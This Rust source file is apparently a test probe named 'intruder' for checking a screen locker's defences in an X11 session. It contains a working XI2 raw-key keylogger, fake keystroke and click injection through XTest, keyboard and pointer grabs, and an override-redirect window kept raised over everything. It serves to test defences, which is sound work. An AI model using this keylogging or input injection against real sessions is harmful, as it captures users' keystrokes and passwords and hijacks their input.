//! DISPOSABLE PROBE helper: an ordinary, unprivileged client in the same X session.
//!
//!   intruder grab                    try to take the keyboard and pointer
//!   intruder type <token>...         XTest keys; tokens are lowercase words or Return/Escape/BackSpace/Menu/F2
//!   intruder click <x> <y> <button>  XTest pointer click
//!   intruder keylog <seconds>        XI2 raw key events on root, the textbook X11 keylogger
//!   intruder window <seconds> [override]  map a window and raise it over everything
//!   intruder stack <xid>             how often <xid> is the topmost viewable window, and focus
//!   intruder mask <xid>              does anyone select VisibilityChangeMask on <xid>?
//!   intruder cm                      owner of _NET_WM_CM_S0 (0 = no compositing manager)

use gdk4_x11::x11::{xinput2, xlib, xtest};
use std::{
    ffi::{CStr, CString},
    mem,
    os::raw::{c_int, c_uint},
    ptr,
    time::{Duration, Instant},
};

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let xlib = xlib::Xlib::open().expect("libX11");
    let dpy = unsafe { (xlib.XOpenDisplay)(ptr::null()) };
    assert!(!dpy.is_null(), "cannot open display");
    let root = unsafe { (xlib.XDefaultRootWindow)(dpy) };
    match args[0].as_str() {
        "grab" => unsafe {
            let k = (xlib.XGrabKeyboard)(
                dpy,
                root,
                xlib::True,
                xlib::GrabModeAsync,
                xlib::GrabModeAsync,
                xlib::CurrentTime,
            );
            let p = (xlib.XGrabPointer)(
                dpy,
                root,
                xlib::True,
                xlib::ButtonPressMask as c_uint,
                xlib::GrabModeAsync,
                xlib::GrabModeAsync,
                0,
                0,
                xlib::CurrentTime,
            );
            println!("INTRUDER grab keyboard={k} pointer={p} (0=GrabSuccess 1=AlreadyGrabbed)");
        },
        "type" => unsafe {
            let xtst = xtest::Xf86vmode::open().expect("libXtst");
            for token in &args[1..] {
                let names: Vec<String> = match token.as_str() {
                    "Return" | "Escape" | "BackSpace" | "Menu" | "F2" => vec![token.clone()],
                    word => word.chars().map(String::from).collect(),
                };
                for name in names {
                    let name = CString::new(name).unwrap();
                    let code = (xlib.XKeysymToKeycode)(dpy, (xlib.XStringToKeysym)(name.as_ptr()))
                        as c_uint;
                    (xtst.XTestFakeKeyEvent)(dpy, code, xlib::True, 0);
                    (xtst.XTestFakeKeyEvent)(dpy, code, xlib::False, 0);
                    (xlib.XSync)(dpy, xlib::False);
                    std::thread::sleep(Duration::from_millis(30));
                }
            }
            println!("INTRUDER typed {:?}", &args[1..]);
        },
        "click" => unsafe {
            let xtst = xtest::Xf86vmode::open().expect("libXtst");
            let (px, py, button): (c_int, c_int, c_uint) = (
                args[1].parse().unwrap(),
                args[2].parse().unwrap(),
                args[3].parse().unwrap(),
            );
            (xtst.XTestFakeMotionEvent)(dpy, -1, px, py, 0);
            (xtst.XTestFakeButtonEvent)(dpy, button, xlib::True, 0);
            (xtst.XTestFakeButtonEvent)(dpy, button, xlib::False, 0);
            (xlib.XSync)(dpy, xlib::False);
            println!("INTRUDER clicked {px},{py} button={button}");
        },
        "keylog" => unsafe {
            let xi = xinput2::XInput2::open().expect("libXi");
            let (mut opcode, mut event, mut error) = (0, 0, 0);
            let name = CString::new("XInputExtension").unwrap();
            (xlib.XQueryExtension)(dpy, name.as_ptr(), &mut opcode, &mut event, &mut error);
            let mut bits = [0u8; 4];
            xinput2::XISetMask(&mut bits, xinput2::XI_RawKeyPress);
            let mut mask = xinput2::XIEventMask {
                deviceid: xinput2::XIAllMasterDevices,
                mask_len: bits.len() as c_int,
                mask: bits.as_mut_ptr(),
            };
            (xi.XISelectEvents)(dpy, root, &mut mask, 1);
            (xlib.XSync)(dpy, xlib::False);
            println!("INTRUDER keylog listening");
            let deadline = Instant::now() + Duration::from_secs(args[1].parse().unwrap());
            let mut captured = String::new();
            while Instant::now() < deadline {
                while (xlib.XPending)(dpy) > 0 {
                    let mut ev: xlib::XEvent = mem::zeroed();
                    (xlib.XNextEvent)(dpy, &mut ev);
                    let mut cookie = ev.generic_event_cookie;
                    if cookie.type_ == xlib::GenericEvent
                        && cookie.extension == opcode
                        && (xlib.XGetEventData)(dpy, &mut cookie) != 0
                    {
                        if cookie.evtype == xinput2::XI_RawKeyPress {
                            let raw = &*(cookie.data as *const xinput2::XIRawEvent);
                            let sym = (xlib.XkbKeycodeToKeysym)(dpy, raw.detail as u8, 0, 0);
                            let text = (xlib.XKeysymToString)(sym);
                            if !text.is_null() {
                                captured.push_str(&CStr::from_ptr(text).to_string_lossy());
                                captured.push(' ');
                            }
                        }
                        (xlib.XFreeEventData)(dpy, &mut cookie);
                    }
                }
                std::thread::sleep(Duration::from_millis(10));
            }
            println!("INTRUDER keylog captured=[{}]", captured.trim_end());
        },
        "window" => unsafe {
            let screen = (xlib.XDefaultScreen)(dpy);
            let win = (xlib.XCreateSimpleWindow)(
                dpy,
                root,
                100,
                100,
                400,
                300,
                0,
                0,
                (xlib.XWhitePixel)(dpy, screen),
            );
            if args.get(2).map(String::as_str) == Some("override") {
                let mut attrs: xlib::XSetWindowAttributes = mem::zeroed();
                attrs.override_redirect = xlib::True;
                (xlib.XChangeWindowAttributes)(dpy, win, xlib::CWOverrideRedirect, &mut attrs);
            }
            let title = CString::new("intruder").unwrap();
            (xlib.XStoreName)(dpy, win, title.as_ptr());
            (xlib.XMapRaised)(dpy, win);
            (xlib.XSync)(dpy, xlib::False);
            println!("INTRUDER window mapped xid=0x{win:x}");
            let deadline = Instant::now() + Duration::from_secs(args[1].parse().unwrap());
            while Instant::now() < deadline {
                (xlib.XRaiseWindow)(dpy, win);
                (xlib.XSync)(dpy, xlib::False);
                std::thread::sleep(Duration::from_millis(500));
            }
        },
        "stack" => unsafe {
            // Sample 20 times over one second: a raise war is a fraction, not a boolean.
            let target = u64::from_str_radix(args[1].trim_start_matches("0x"), 16).unwrap();
            let mut on_top = 0;
            let mut last_top = 0;
            for _ in 0..20 {
                let (mut r, mut parent, mut list, mut count) = (0, 0, ptr::null_mut(), 0 as c_uint);
                (xlib.XQueryTree)(dpy, root, &mut r, &mut parent, &mut list, &mut count);
                let children = std::slice::from_raw_parts(list, count as usize);
                let top = children.iter().rev().copied().find(|w| {
                    let mut attrs: xlib::XWindowAttributes = mem::zeroed();
                    (xlib.XGetWindowAttributes)(dpy, *w, &mut attrs);
                    attrs.map_state == xlib::IsViewable
                });
                (xlib.XFree)(list.cast());
                if top == Some(target) {
                    on_top += 1;
                } else {
                    last_top = top.unwrap_or(0);
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            let (mut focus, mut revert) = (0, 0);
            (xlib.XGetInputFocus)(dpy, &mut focus, &mut revert);
            println!(
                "INTRUDER stack lock-on-top={on_top}/20 other-top=0x{last_top:x} focus=0x{focus:x}"
            );
        },
        "mask" => unsafe {
            let target = u64::from_str_radix(args[1].trim_start_matches("0x"), 16).unwrap();
            let mut attrs: xlib::XWindowAttributes = mem::zeroed();
            (xlib.XGetWindowAttributes)(dpy, target, &mut attrs);
            println!(
                "INTRUDER mask all_event_masks_has_visibility={}",
                attrs.all_event_masks & xlib::VisibilityChangeMask != 0
            );
        },
        "cm" => unsafe {
            let name = CString::new("_NET_WM_CM_S0").unwrap();
            let atom = (xlib.XInternAtom)(dpy, name.as_ptr(), xlib::False);
            println!(
                "INTRUDER compositing-manager-owner=0x{:x}",
                (xlib.XGetSelectionOwner)(dpy, atom)
            );
        },
        other => panic!("unknown command {other}"),
    }
    unsafe { (xlib.XCloseDisplay)(dpy) };
}
